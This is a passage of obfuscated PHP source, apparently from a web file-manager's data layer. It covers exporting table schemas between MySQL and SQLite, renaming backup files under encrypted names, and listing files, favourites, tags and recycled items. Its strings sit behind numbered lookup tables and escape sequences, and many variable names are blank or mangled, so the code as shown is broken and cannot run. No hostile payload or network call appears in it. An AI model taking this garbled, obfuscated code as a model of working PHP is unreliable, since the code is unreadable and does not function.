$Ƶ) { if ($Ƶ) { $Ƶ = strtolower($Ƶ); } else { continue; } $َ->execute($熖[1242] . $this->escapeName($Ƶ) . $熖[1243]); } } private function sqlEncode($ڵ) { $򌽓 =& $_SERVER[]; $͊ = array(); foreach ($ڵ as $Ã) { if (is_array($Ã)) { $Ã = json_encode_force($Ã); } $Ã = addslashes($Ã); $Ã = str_replace(array($򌽓[1244], $򌽓[285], $򌽓[417]), array($򌽓[1245], $򌽓[1246], $򌽓[1247]), $Ã); $͊[] = $Ã; } return $򌽓[58] . implode($򌽓[1248], $͊) . $򌽓[58]; } private function sqlDecode($, $, $Ǚ = '') { $؃ =& $_SERVER[]; $ = str_replace(array($؃[1245], $؃[1246], $؃[1247]), array($؃[1244], $؃[285], $؃[417]), $); if ($ == $؃[13]) { $ = str_ireplace($؃[1249], $؃[59], $); $ = stripslashes($); } return preg_replace($؃[1250], $؃[12], $); if ($ == $؃[13]) { return $Ǚ != $؃[472] ? stripslashes($) : $; } if ($Ǚ == $؃[472]) { $ = str_replace($؃[1251], $؃[118], stripslashes($)); } return $; } public function getSqlFile($ו = '') { $ =& $_SERVER[]; $σ = $this->dbType(!0); $֖ = CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\154\57\x64\x61\x74\x61\x2f{$σ}\x2e\x73\x71\154"; if (!file_exists($֖)) { return !1; } $ = file_get_contents($֖); $ܴ = $[1252] . ($σ == $[895] ? $[1253] : $[1254]) . $[1255]; preg_match_all($ܴ, $, $䯗); $ = $䯗[1]; $Дȇ = $this->model()->db(); $͇ = $Дȇ->getTables(); $׹ = TEMP_FILES . $[1256] . date($[259]) . $[8]; del_dir($׹); mk_dir($׹); $Ե = $׹ . $[1257]; $ۏ = $׹ . $[1258]; $쨷 = $σ == $[13] ? $[895] : $[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\x6c\x2f\x64\141\164\141\57{$쨷}\x2e\x73\161\154", $׹); @touch($׹ . $σ . $[885]); $ = fopen($Ե, $[1230]); $ = fopen($ۏ, $[1230]); if ($σ == $[13]) { $͇ = array_diff($͇, array($[878], $[879])); $溺 = array($[1259], $[1260], $[1261]); fwrite($, implode(PHP_EOL, $溺) . PHP_EOL . PHP_EOL); foreach ($͇ as $ø) { $ = $this->sqlFromSqlite($ø); if (!$[$[13]]) { continue; } fwrite($, $[$[13]] . PHP_EOL . PHP_EOL); if (!in_array($ø, $)) { fwrite($, $[$[895]] . PHP_EOL . PHP_EOL); } } } else { foreach ($͇ as $ø) { $ = $this->sqlFromMysql($ø); if (!$[$[895]]) { continue; } fwrite($, $[$[895]] . PHP_EOL . PHP_EOL); if (!in_array($ø, $)) { fwrite($, $[$[13]] . PHP_EOL . PHP_EOL); } } } fclose($); fclose($); $ = array($[895] => $Ե, $[13] => $ۏ); return $ו ? $[$ו] : $; } public function dbType($ = false) { $ =& $_SERVER[]; $ɟ = $ ? $GLOBALS[$[6]][$[21]] : $this->database; $ɟ = array_change_key_case($ɟ); $ؕ = $ɟ[$[1129]]; if ($ؕ == $[1126]) { $ἶʂ = explode($[4], $ɟ[$[1135]]); $ؕ = $ἶʂ[0]; } $ = array($[1262] => $[13], $[1071] => $[895]); if (isset($[$ؕ])) { $ؕ = $[$ؕ]; } return $ؕ; } public function sqlFromMysql($ځ, $ = '') { $ =& $_SERVER[]; $ = array($[895] => $[12], $[13] => $[12]); $ = $this->escapeName($ځ); $֡ = $this->escapeName($ځ, $[13]); $Ŵ = $this->model()->db(); $˙ = $Ŵ->query("\163\x68\x6f\167\x20\x63\x72\x65\x61\x74\x65\x20\x74\x61\142\x6c\145\40{$}\x3b"); if (!$˙ || !$˙[0]) { return !1; } $ = _get($˙[0], $[1263], $[12]); if (!$) { return !1; } $М = "\104\x52\117\x50\x20\124\101\x42\114\x45\x20\x49\x46\x20\105\130\x49\x53\124\x53\40{$}\73" . PHP_EOL . $ . $[74]; if ($ == $[895]) { return $М; } $[$[895]] = $М; $ = array_change_key_case($GLOBALS[$[6]][$[21]]); $秛 = $[$[1134]]; $߁ = $[1264] . $秛 . "\47\x20\x41\116\104\40\124\101\102\x4c\x45\137\116\x41\115\x45\x20\75\40{$֡}\x3b"; $ʒ = "\123\110\x4f\x57\40\111\x4e\104\x45\130\40\x46\x52\117\x4d\40{$}\x3b"; $ٔ = $Ŵ->query($߁); if (empty($ٔ)) { return $ ? $[$] : $; } $ = $Ŵ->query($ʒ); $ϋ = $[12]; $ = array(); foreach ($ as $) { if (!$ϋ && $[$[1265]] == $[1266]) { $ϋ = $[$[1267]]; } if (isset($[$[$[1265]]])) { $[$[$[1265]]][$[1268]][] = $[$[1267]]; continue; } $[$[$[1265]]] = array($[1269] => $[$[1265]], $[1268] => array($[$[1267]]), $[1270] => $[$[1271]] == $[91] ? 0 : 1); } $ = array(); foreach ($ as $) { $莍 = $[$[1269]] == $[1266]; $Ƭ = $[$[1270]] == $[91] && !$莍 ? $[1272] : $[12]; $ڃ = $[1273] . $ځ . $[11] . ($莍 ? $[1274] : $[$[1269]]); $ = $[1275] . implode($[1276], $[$[1268]]) . $[1277]; $[] = sprintf($[1278], $[1279], $Ƭ, $[1280], $ڃ, $[1281], $ځ, $); } $پ = array(); $ڴ = array($[1282] => $[390], $[1283] => $[390], $[364] => $[390], $[363] => $[390], $[1284] => $[1285], $[1286] => $[1285], $[1285] => $[1285], $[1287] => $[1285], $[282] => $[1285], $[1288] => $[1285], $[1289] => $[1285], $[1290] => $[1291], $[365] => $[1291], $[366] => $[1291], $[1292] => $[1292]); foreach ($ٔ as $) { $ = _get($ڴ, $[$[1293]], $[$[1294]]); $ĵ = $[$[1295]] == $[1054] ? $[1296] : $[1297]; $ = $[$[1298]] == $ϋ ? $[1299] : $[12]; $܁ = $[$[1108]] ? strtoupper(str_replace($[11], $[12], $[$[1108]])) : $[12]; $پ[] = sprintf($[1300], $[$[1298]], $, $ĵ, $, $܁); } $ = array("\x44\x52\117\x50\40\x54\x41\102\x4c\x45\40\111\x46\40\x45\130\111\x53\x54\123\40{$֡}\73", "\103\x52\105\x41\124\x45\40\x54\101\102\x4c\x45\x20{$֡}\x20\x28", implode($[50] . PHP_EOL, $پ), $[1301]); $ɗ = implode(PHP_EOL, array_merge($, $)); if ($ == $[13]) { return $ɗ; } $[$[13]] = $ɗ; return $; } public function sqlFromSqlite($Ċ, $ذ = '') { $錣 =& $_SERVER[]; $à = array($錣[895] => $錣[12], $錣[13] => $錣[12]); $ = $this->escapeName($Ċ); $җ = $this->escapeName($Ċ, $錣[13]); $؊ = $this->model()->db(); $½½ = "\120\x52\x41\107\115\x41\40\124\x41\102\114\105\137\x49\116\106\x4f\40\x28\47{$Ċ}\47\51"; $޻ = "\123\x45\114\x45\103\124\x20\x2a\40\x46\x52\117\115\40\163\161\x6c\x69\164\x65\x5f\155\141\x73\x74\145\x72\x20\127\x48\105\x52\x45\40\164\142\x6c\137\x6e\x61\155\145\40\75\x20\47{$Ċ}\x27"; $ = $؊->query($½½); if (empty($)) { return $ذ ? $à[$ذ] : $à; } $ = $؊->query($޻); $ͤč = $̿ = array(); foreach ($ as $ݸǌ) { if ($ݸǌ[$錣[33]] == $錣[357]) { $ͤč[] = $ݸǌ[$錣[1302]]; } else { $̿[] = $ݸǌ[$錣[1302]]; } } $厑 = array_merge(array("\104\122\117\x50\40\x54\101\102\114\x45\40\x49\x46\x20\105\130\111\x53\x54\x53\x20{$җ}\x3b"), $ͤč, $̿); $厑 = implode($錣[74] . PHP_EOL, $厑) . $錣[74]; if ($ذ == $錣[13]) { return $厑; } $à[$錣[13]] = $厑; $ = $ = array(); $Û = array(); $ = array(); foreach ($ as $ݸǌ) { if ($ݸǌ[$錣[33]] == $錣[1303]) { $ = $ݸǌ[$錣[1302]]; $͋ = stripos($, $錣[1272]) !== !1; $ = stripos($, $錣[1266]) !== !1; preg_match($錣[1304], $, $); if (empty($)) { continue; } $ = array_map($錣[1305], explode($錣[50], $[1])); $ = array(); foreach ($ as $΋) { $ = trim($΋, $錣[1306]); $[] = $; $Û[$] = !0; } $[] = array($錣[32] => $ݸǌ[$錣[32]], $錣[1302] => $, $錣[1307] => $͋, $錣[1308] => $, $錣[1309] => $); } } $׆ = array($錣[1283] => $錣[1283], $錣[390] => $錣[1310], $錣[1291] => $錣[1311], $錣[1285] => $錣[1285], $錣[1292] => $錣[1312], $錣[1313] => $錣[1314]); $ = array($錣[451], $錣[168], $錣[540]); $򑳍 = array($錣[390], $錣[1291], $錣[1313], $錣[1283]); foreach ($ as $ݸǌ) { $ڈ = $ݸǌ[$錣[32]]; $镲 = strtolower($ݸǌ[$錣[33]]); if ($镲 == $錣[1285] && isset($Û[$ڈ])) { $ذ = in_array($ڈ, $) ? $錣[1285] : $錣[1315]; } else { $ذ = _get($׆, $镲, $镲); } if ($ݸǌ[$錣[57]] > 0) { $[$ݸǌ[$錣[57]]] = $ڈ; } $ = $錣[12]; if ($ݸǌ[$錣[56]] !== null) { $ƶ = $ݸǌ[$錣[56]]; if (in_array($镲, $򑳍) && is_numeric($ƶ)) { $ = "\x44\105\x46\x41\125\114\x54\40{$ƶ}"; } else { if (strtolower($ƶ) === $錣[103]) { $ = $ݸǌ[$錣[35]] ? $錣[12] : $錣[1297]; } else { $ƶˋ = is_numeric($ƶ) ? $ƶ : $錣[58] . addslashes($ƶ) . $錣[58]; $ = "\104\x45\x46\101\x55\114\124\x20{$ƶˋ}"; } } } $ = $ݸǌ[$錣[35]] ? $錣[1296] : $錣[1316]; $ܪ = stripos($镲, $錣[364]) !== !1 && $ݸǌ[$錣[57]] ? $錣[1317] : $錣[12]; $[] = sprintf($錣[1318], $ڈ, $ذ, $, $, $ܪ); } if (!empty($)) { ksort($); $ = $錣[475] . implode($錣[1238], $) . $錣[475]; $[] = "\x50\122\x49\115\x41\122\131\40\113\x45\131\40\50{$}\x29"; } foreach ($ as $۸) { if ($۸[$錣[1308]]) { continue; } $ = array(); foreach ($۸[$錣[1309]] as $΋) { $׆ = null; foreach ($ as $) { if ($[$錣[32]] == $΋) { $׆ = strtolower($[$錣[33]]); break; } } if ($׆ == $錣[1285] && in_array($΋, $)) { $[] = "\x60{$΋}\140\50\62\65\60\51"; } else { $[] = "\140{$΋}\x60"; } } $镲 = ($۸[$錣[1307]] ? $錣[1319] : $錣[12]) . $錣[1320]; $̶Ӽ = str_replace($錣[1273] . $Ċ . $錣[11], $錣[12], $۸[$錣[32]]); $̶Ӽ = str_replace($Ċ . $錣[11], $錣[12], $̶Ӽ); $[] = "{$镲}\x20\x60{$̶Ӽ}\140\x20\50" . implode($錣[50], $) . $錣[1237]; } $ܭ = array("\x44\122\x4f\120\x20\x54\x41\x42\114\105\40\111\106\x20\105\x58\111\123\124\123\40{$}\x3b", "\103\122\105\x41\x54\x45\40\124\x41\102\x4c\x45\x20{$}\x20\x28", implode($錣[50] . PHP_EOL, $), $錣[1321]); $ܭ = implode(PHP_EOL, $ܭ); if ($ذ == $錣[895]) { return $ܭ; } $à[$錣[895]] = $ܭ; return $à; } private function escapeName($Ȟ, $έ = "\x6d\171\x73\161\154") { $ی =& $_SERVER[]; $Ȟ = preg_replace($ی[1322], $ی[12], $Ȟ); if ($έ === $ی[895]) { return "\140{$Ȟ}\140"; } return "\x22{$Ȟ}\x22"; } public function mixBakList($˼) { $괁 =& $_SERVER[]; $˼ = rtrim($˼, $괁[8]) . $괁[8]; $֢ = $괁[1323]; $ = IO::listPath($˼); if (empty($[$괁[86]])) { return !1; } $ = array(); foreach ($[$괁[86]] as $ => $) { if (!$[$괁[32]] || !$[$괁[87]]) { continue; } $ = Mcrypt::encode($[$괁[32]], $֢); $ = md5($); IO::rename($[$괁[87]], $); $[$] = $; } $ǅ = md5($괁[1324] . $֢); IO::setContent($˼ . $ǅ, json_encode($)); return !0; } public function unmixBakList($ڸ) { $ܐ =& $_SERVER[]; $ڸ = rtrim($ڸ, $ܐ[8]) . $ܐ[8]; $̔ = $this->unmixBakListGet($ڸ, !0); if (empty($̔)) { return !1; } foreach ($̔ as $벋 => $䅩) { $ԛ = IO::rename($ڸ . $䅩, $벋); if (!$ԛ) { return !1; } } return !0; } public function unmixBakListGet($, $ݼ = false) { $Φ =& $_SERVER[]; $ = rtrim($, $Φ[8]) . $Φ[8]; $ = $Φ[1323]; $ = md5($Φ[1324] . $); $ = $ . $; if (!IO::exist($)) { return !1; } $ӟ = json_decode(IO::getContent($), !0); if (empty($ӟ)) { return !1; } $ľ = array(); foreach ($ӟ as $ٔ => $) { $ = Mcrypt::decode($, $); $ľ[$] = $ٔ; } if ($ݼ) { IO::remove($, !1); } return $ľ; } } goto B; Bѻˈ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($ = false, $ = "\x6d\x6f\x64\151\x66\171\x54\151\x6d\x65", $ = false) { $ħ =& $_SERVER[]; $ = Model($this->modelType)->get(!1, $this->optionType, !0); $޿ = array_values($); if ($޿ && $޿[0] && !is_array($޿[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$) { return $ ? null : array(); } if (!$ && $ !== $ħ[228]) { $ = array_filter(array_values($)); return array_sort_by($, $, $, $ħ[487]); } return $[$ħ[488] . $]; } public function insert($Ť) { $ =& $_SERVER[]; $Ť = array_field_key($Ť, $this->field); $ڵ = Model($this->modelType)->get($[489], $this->optionType . $[490]); $ڵ = $ڵ ? $ڵ : 0; $Ť[$[487]] = ++$ڵ; $Ť[$[231]] = time(); $Ť[$[88]] = time(); Model($this->modelType)->set($[489], $ڵ, $this->optionType . $[490]); Model($this->modelType)->set($[488] . $ڵ, $Ť, $this->optionType); return $ڵ; } public function insertArr($񬕕) { $婞 =& $_SERVER[]; if (!$񬕕 || !is_array($񬕕)) { return !1; } $̈́ = Model($this->modelType)->get($婞[489], $this->optionType . $婞[490]); $̈́ = $̈́ ? $̈́ : 0; $ = array(); foreach ($񬕕 as $ʋ) { $ݕ = array_field_key($ʋ, $this->field); $ݕ[$婞[487]] = ++$̈́; $ݕ[$婞[231]] = time(); $ݕ[$婞[88]] = time(); $[$婞[488] . $̈́] = $ݕ; } Model($this->modelType)->set($婞[489], $̈́, $this->optionType . $婞[490]); Model($this->modelType)->set($, !1, $this->optionType); return $̈́; } public function update($ò, $ٿ) { $ɀ =& $_SERVER[]; $ٿ = array_field_key($ٿ, $this->field); $Ք = $this->listData($ò); if (!$Ք || !$ò) { return !1; } $ٿ = array_merge($Ք, $ٿ); $ٿ[$ɀ[88]] = time(); return Model($this->modelType)->set($ɀ[488] . $ò, $ٿ, $this->optionType); } public function remove($͇) { if (!$͇) { return !1; } return Model($this->modelType)->remove($_SERVER[][488] . $͇, $this->optionType); } public function removeArr($ڒ) { if (!$ڒ) { return !0; } $ӛ = array(); foreach ($ڒ as $) { $ӛ[] = $_SERVER[][488] . $; } return Model($this->modelType)->removeArr($ӛ, $this->optionType); } public function clear() { $ɮ =& $_SERVER[]; Model($this->modelType)->remove($ɮ[489], $this->optionType . $ɮ[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($, $Ь) { if (!$Ь) { return !1; } $Է = $this->listData(); $Է = array_to_keyvalue($Է, $); return isset($Է[$Ь]) ? $Է[$Ь] : !1; } public function findByName($ð) { return $this->findByKey($_SERVER[][32], $ð); } protected function resetData($) { $Ѫ =& $_SERVER[]; if (!$) { return; } $ = is_array($) ? $ : array(); $Ӟ = array(); for ($릟 = 0; $릟 < count($); $릟++) { if (!$[$릟] || !$[$릟][$Ѫ[487]]) { continue; } $Ӟ[$Ѫ[488] . $[$릟][$Ѫ[487]]] = $[$릟]; } return Model($this->modelType)->set($Ӟ, !1, $this->optionType); } private function getAutoName($ܵ) { $ = array_to_keyvalue($this->listData(), $_SERVER[][32]); if (!$ || !isset($[$ܵ])) { return $ܵ; } for ($ = 1; $ < count($); $++) { $£ = $ܵ . "\x28{$}\51"; if (!isset($[$£])) { return $£; } } return $£; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($̷ = false, $琏 = '', $袪 = false, $ = true) { $̂ =& $_SERVER[]; $ʟ = $this->cacheGet($琏); $ = $this->optionDefault($琏); $ = is_array($) ? $ : array(); if (is_array($ʟ)) { if ($) { $ʟ = array_merge($, $ʟ); } return $̷ ? isset($ʟ[$̷]) ? $ʟ[$̷] : null : $ʟ; } $ = $this->filterWhere(array($̂[33] => $琏)); $ʟ = $this->where($)->select(); $ʟ = array_to_keyvalue($ʟ, $̂[95], $̂[451]); foreach ($ʟ as $ԺǸ => $) { if ($袪 || in_array($ԺǸ, $this->jsonField)) { $ʟ[$ԺǸ] = json_decode($, !0); } } $this->cacheSet($琏, $ʟ); if ($) { $ʟ = array_merge($, $ʟ); } return $̷ ? $ʟ[$̷] : $ʟ; } public function set($¥ř, $ˀ = false, $ = '') { $ݪ =& $_SERVER[]; if (!$¥ř) { return !0; } $ = $this->get(!1, $, !1, !1); $ = is_array($) ? $ : array(); $ž = array(); $ = array(); $ = array(); $ = is_array($¥ř) ? $¥ř : array($¥ř => $ˀ); $΃ = $this->filterWhere(array($ݪ[33] => $)); foreach ($ as $ǹ => $٠܆) { if (is_array($٠܆)) { $٠܆ = json_encode_force($٠܆); } $this->checkLength($٠܆, !1, $this->tableName . $ݪ[4] . $¥ř); $٠܆ = self::textEncode($٠܆); if (array_key_exists($ǹ, $)) { $׃ = is_array($[$ǹ]) ? json_encode_force($[$ǹ]) : $[$ǹ]; $׃ = self::textEncode($׃); if ($׃ === $٠܆) { continue; } $[] = array($ݪ[95], $ǹ, $ݪ[451], $٠܆, $ݪ[88], time()); } else { $ = array($ݪ[33] => $, $ݪ[95] => $ǹ, $ݪ[451] => $٠܆); $ž[] = $this->filterWhere($); } } if (!$ž && !$) { return !0; } $this->cacheRemove($); $ʏȭ = $this->cacheKey($ݪ[491]); CacheLock::lock($ʏȭ); if ($ž) { $this->addAll($ž); } if ($) { $this->saveAll($, $΃); } CacheLock::unlock($ʏȭ); return !0; } protected function optionDefault($艊ᶏ = '') { return !1; } public function setDeep($, $ = false, $ = '') { $ = explode($_SERVER[][10], $); $ = $this->get(); array_set_value($, $, $); $this->set($[0], $[$[0]], $); } public function remove($ɩ, $ = '') { $Ԏڑ =& $_SERVER[]; $this->cacheRemove($); $቉ = $this->filterWhere(array($Ԏڑ[95] => $ɩ, $Ԏڑ[33] => $)); if (is_null($ɩ)) { unset($቉[$Ԏڑ[95]]); } return $this->where($቉)->delete(); } public function removeArr($, $͑ = '') { $ =& $_SERVER[]; if (!$ || !is_array($)) { return !0; } $this->cacheRemove($͑); $ܧʙ = $this->filterWhere(array($[33] => $͑, $[95] => array($[7], $))); return $this->where($ܧʙ)->delete(); } public function cacheSet($և, $ˏ = false) { return Cache::set($this->cacheKey($և), $ˏ); } public function cacheGet($) { return Cache::get($this->cacheKey($)); } public function cacheRemove($؇) { return Cache::remove($this->cacheKey($؇)); } protected function filterWhere($) { return $; } protected function cacheKey($) { return $; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\143\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\151\x6f\137\163\x6f\165\162\x63\145\x5f\155\x65\164\141", "\x6d\145\164\x61\x46\151\145\x6c\x64" => "\163\x6f\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\124\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\143\164\151\x6f\x6e"), array("\143\162\145\x61\x74\x65\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\x75\x6e\x63\164\151\x6f\156"), array("\x76\151\x65\167\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\145\162\x74", "\146\165\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($) { return $this->listSource(array($_SERVER[][492] => $)); } public function typeName($ď) { static $ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $[$ď . $_SERVER[][12]]; } public function sourceListInfo($, $ = false) { $ =& $_SERVER[]; $ = $ ? $ : array(); $ = array_filter(array_unique($)); if (!$) { return array(); } $군 = $this->where(array($[191] => array($[7], $)))->select(); $this->_listDataApply($군, $); return array_to_keyvalue($군, $[191]); } public function pathInfoFilter(&$) { $۪ =& $_SERVER[]; static $ = false; static $՗ = false; static $ = false; if (!$) { $ = $۪[493]; $ .= $۪[494]; $ .= $۪[495]; $ = $۪[496]; $ = explode($۪[50], $); $ = explode($۪[50], $); $՗ = array(); foreach ($ as $Ε) { if (in_array($Ε, $)) { continue; } $՗[] = $Ε; } $ = explode($۪[50], $۪[497]); } foreach ($ as $) { if (isset($[$])) { $[$] = intval($[$]); } } $[$۪[87]] = $۪[498] . $[$۪[191]] . $۪[499]; $[$۪[33]] = $[$۪[500]] == 1 ? $۪[78] : $۪[230]; $[$۪[188]] = $this->typeName($[$۪[188]]); if ($[$۪[500]] != 1) { $[$۪[166]] = $[$۪[501]]; unset($[$۪[501]]); } $޳ = $; if (isset($[$۪[502]]) && $[$۪[502]][$۪[503]] == -1) { $޳ = $՗; } $ = array_field_key($, $޳); return $; } public function listUserFav() { $؂ =& $_SERVER[]; $ = Model($؂[504])->listData(); $ = array_filter_by_field($, $؂[33], $؂[505]); $ = array_to_keyvalue($, $؂[12], $؂[87]); if ($) { $ﶫ = $this->listSource(array($؂[506] => array($؂[507], $))); } $ﶫ = array_to_keyvalue($ﶫ[$؂[446]], $؂[191]); foreach ($ as &$ݧ姀) { $ݧ姀 = array($؂[508] => $ݧ姀[$؂[487]], $؂[509] => $ݧ姀[$؂[32]], $؂[510] => $ݧ姀[$؂[87]], $؂[511] => $ݧ姀[$؂[33]], $؂[512] => $ݧ姀[$؂[231]], $؂[513] => $ݧ姀[$؂[88]]); if ($ݧ姀[$؂[33]] == $؂[505] && $ﶫ[$ݧ姀[$؂[87]]]) { $ݧ姀[$؂[90]] = $ﶫ[$ݧ姀[$؂[87]]]; } } unset($ݧ姀); return $; } public function listUserTag($) { $ =& $_SERVER[]; if ($ && !is_array($)) { $ = array($); } $҇ = Model($[514])->listData(); $ߛ = array(); $ = array(); foreach ($҇ as $߶) { $ = $߶[$[87]]; if (!$) { continue; } if (!isset($[$])) { $[$] = array(); } $[$][] = $߶[$[515]]; $ߛ[$߶[$[87]]] = $߶; } $З = array(); $ = array(); $Ϯҹ = array(); foreach ($ as $Տݗ => $) { $Ѹ = !0; if (!$) { $З[] = $Տݗ; continue; } foreach ($ as $խÁ) { if (!in_array($խÁ, $)) { $Ѹ = !1; break; } } if (!$Ѹ) { continue; } if (!is_numeric($Տݗ)) { $ = $ߛ[$Տݗ]; $ж = array($[32] => $[$[32]], $[87] => $[$[87]], $[33] => $[$[33]], $[90] => array($[516] => 1), $[232] => !0); if ($[$[33]] == $[230]) { $Ϯҹ[] = $ж; } if ($[$[33]] == $[78]) { $[] = $ж; } continue; } $З[] = $Տݗ; } if ($З) { $ = $this->listSource(array($[506] => array($[507], $З))); } $ = $ ? $ : array($[85] => array(), $[86] => array()); $[$[85]] = array_merge($[$[85]], $); $[$[86]] = array_merge($[$[86]], $Ϯҹ); if (isset($[$[443]]) && count($З) == $[$[443]][$[444]]) { return $; } $ڹ = array(); $Ң = array_to_keyvalue($[$[85]], $[12], $[191]); $ = array_to_keyvalue($[$[86]], $[12], $[191]); $ = array_merge($, $Ң); foreach ($З as $) { if (!in_array($, $)) { $ڹ[] = $; } } if ($ڹ) { Model($[517])->removeBySource($ڹ); } return $; } public function listUserRecycle() { $܎ =& $_SERVER[]; $Ն = Model($܎[518])->listData(); if (!$Ն) { return array(); } $ = array($܎[506] => array($܎[507], $Ն), $܎[519] => 1); return $this->listSource($); } public function listSource($ܔ, $ = 3000, $į = false) { $æ =& $_SERVER[]; if (!isset($ܔ[$æ[520]])) { $ܔ[$æ[520]] = 0; } if (isset($ܔ[$æ[190]]) && $ܔ[$æ[190]] == $æ[228]) { $ܔ[$æ[501]] = array($æ[464], $æ[12]); } if (isset($ܔ[$æ[190]])) { $ܔ[$æ[190]] = intval($ܔ[$æ[190]]); } $쬌 = $æ[521]; $ = $this->field($쬌)->_makeOrder()->where($ܔ)->selectPage($); $this->_listPageCheck($, $쬌, $ܔ); $this->_listDataApply($[$æ[446]], $į); $this->_listMake($); return $; } private function _listPageCheck(&$, $ى, $ấ) { $ =& $_SERVER[]; if (!is_array($[$[443]])) { return; } $Ս = $[$[443]]; if ($Ս[$[445]] <= 1) { return; } if ($Ս[$[444]] >= 100000) { return; } if (Model($[522])->get($[523]) != $[524]) { return; } $ى = str_replace(array($[53], $[417], $[285]), $[12], $ى); $ى = $[525] . str_replace($[50], $[526], $ى) . $[527]; $ = $[528]; $ = $ . $[529]; $܂˓ = $Ս[$[439]] * ($Ս[$[428]] - 1) . $[50] . $Ս[$[439]]; $ = $this->_makeOrder(!0); $ = $[525] . str_replace($[50], $[526], $[0]); if (strpos($, $[530])) { $ = str_replace($[530], $[531], $); } else { $ .= $[532] . $[1]; } $ّÿ = array(); foreach ($ấ as $ʉ => $ٹӳ) { $ّÿ[$[525] . $ʉ] = $ٹӳ; } $this->alias($[533])->field($ى)->limit($܂˓)->order($); $ = $this->join($)->where($ّÿ)->select(); if ($) { $[$[446]] = $; } } protected function _makeOrder($׍ʐ = false) { $ژķ։ =& $_SERVER[]; $ = Model($ژķ։[534])->get($ژķ։[535]); $ = Model($ژķ։[534])->get($ژķ։[536]); $ֆĖ = array($ژķ։[537] => $ژķ։[538], $ژķ։[539] => $ژķ։[540]); $ѹђ = array($ژķ։[32] => $ژķ։[32], $ژķ։[79] => $ژķ։[79], $ژķ։[166] => $ژķ։[501], $ژķ։[541] => $ژķ։[541], $ژķ։[542] => $ژķ։[543], $ژķ։[231] => $ژķ։[231], $ژķ։[88] => $ژķ։[88]); $ގ = Input::get($ژķ։[544], $ژķ։[7], $, array_keys($ѹђ)); $ = Input::get($ژķ։[545], $ژķ։[7], $, array_keys($ֆĖ)); if (!in_array($ގ, array_keys($ѹђ))) { $ގ = $ژķ։[32]; } if (!in_array($, array_keys($ֆĖ))) { $ގ = $ژķ։[537]; } if ($ގ == $ژķ։[32]) { } $ = $ژķ։[546] . $ѹђ[$ގ] . $ژķ։[53] . $ֆĖ[$]; $ = rtrim(trim($), $ژķ։[50]); if ($׍ʐ) { return array($, $ֆĖ[$]); } return $this->order($); } protected function _listDataApplyItem($ڬݱ, $ҕ = false) { $ = array($ڬݱ); $this->_listDataApply($, $ҕ); return $[0]; } protected function _listDataApply(&$ګ, $ = false) { $ҫ =& $_SERVER[]; if (!$ګ) { $ګ = array(); return; } $Ǿ = array_to_keyvalue($ګ, $ҫ[12], $ҫ[191]); $Ǿ = array_unique($Ǿ); $Ǿ = array_to_int($Ǿ); $this->_listSourceCache($ګ); if (!$) { $this->_listAppendMeta($ګ, $Ǿ); $this->_listAppendFileMeta($ګ, $Ǿ); $this->_listAppendChildren($ګ, $Ǿ); } $this->_listAppendPath($ګ); $this->_listAppendAuth($ګ); $this->_listAppendSourceInfo($ګ, $Ǿ); $this->_listAppendUser($ګ); $this->_listFilterInfo($ګ, $); $this->_listAppendAuthSecret($ګ); } protected function _listSourceCache($) { $μ =& $_SERVER[]; foreach ($ as $ݾƟ) { self::$cacheSourceInfo[$μ[547] . $ݾƟ[$μ[191]]] = $ݾƟ; } } protected function _listFilterInfo(&$܌, $ѭ = false) { $ =& $_SERVER[]; foreach ($܌ as &$ع贄) { $ع贄 = $this->pathInfoFilter($ع贄); self::$cachePathInfo[$[548] . intval($ѭ) . $[476] . $ع贄[$[191]]] = $ع贄; } unset($ع贄); } protected function _listMake(&$ܽ) { $ƿ =& $_SERVER[]; $ܽ[$ƿ[85]] = array(); $ܽ[$ƿ[86]] = array(); foreach ($ܽ[$ƿ[446]] as $) { $ǐ = $[$ƿ[500]] == 1 ? $ƿ[85] : $ƿ[86]; $ܽ[$ǐ][] = $; } unset($ܽ[$ƿ[446]]); } protected function _listAppendMeta(&$, $) { $ =& $_SERVER[]; $ؼ = array($[506] => array($[507], $)); $ = Model($[549])->field($[550])->where($ؼ)->select(); if (!$) { return; } $ͯ = array($[551], $[552], $[531]); $ = array(); foreach ($ as $) { if (!isset($[$[$[191]]])) { $[$[$[191]]] = array(); } if (in_array($[$[95]], $ͯ)) { continue; } if ($[$[95]] == $[553]) { $[$[451]] = $[554]; } $[$[$[191]]][$[$[95]]] = $[$[451]]; } foreach ($ as &$) { $[$[555]] = !1; if (isset($[$[$[191]]])) { $[$[555]] = $[$[$[191]]]; } if ($this->fileIsLock($) && $[$[502]]) { $ӁɅ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $[$[502]][$[503]] = AuthModel::authDisable($[$[502]][$[503]], $ӁɅ); $[$[502]][$[556]][$[502]] = $[$[502]][$[503]]; } } unset($); } protected function _listAppendFileMeta(&$ާ, $) { $ =& $_SERVER[]; $ = array_to_keyvalue($ާ, $[12], $[557]); $ = array_filter(array_unique($)); $ = array_to_int($); if (!$) { return; } $ﮊ = array($[558] => array($[507], $)); $ = $[559]; $ = Model($[560])->field($)->where($ﮊ)->select(); $ = array_to_keyvalue($, $[557]); $Ȑ = 